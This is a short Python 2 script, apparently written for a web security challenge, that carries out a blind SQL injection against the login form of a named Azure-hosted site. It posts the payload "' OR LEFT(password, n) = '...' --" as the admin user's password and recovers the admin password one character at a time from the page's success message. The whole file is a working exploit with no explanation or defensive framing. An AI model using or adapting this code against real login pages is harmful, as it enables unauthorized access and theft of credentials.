import requests, string

charset = string.letters + string.digits + '!"#$%&()*+,-./:;<=>?@[]^_`{|}~'

password = ''

while True:
    for c in charset:
        d = {"username": "admin", "password": "' OR LEFT(password, {}) = '{}' -- ".format(len(password)+1, password + c), "submit": "Submit"}
        resp = requests.post("http://bts-951ad0f8b072458c91c769e85466ab34.azurewebsites.net/Home/Login", data=d).content
        if 'successfully' in resp:
            password += c
            print password
            break
    print "iterated through entire charset"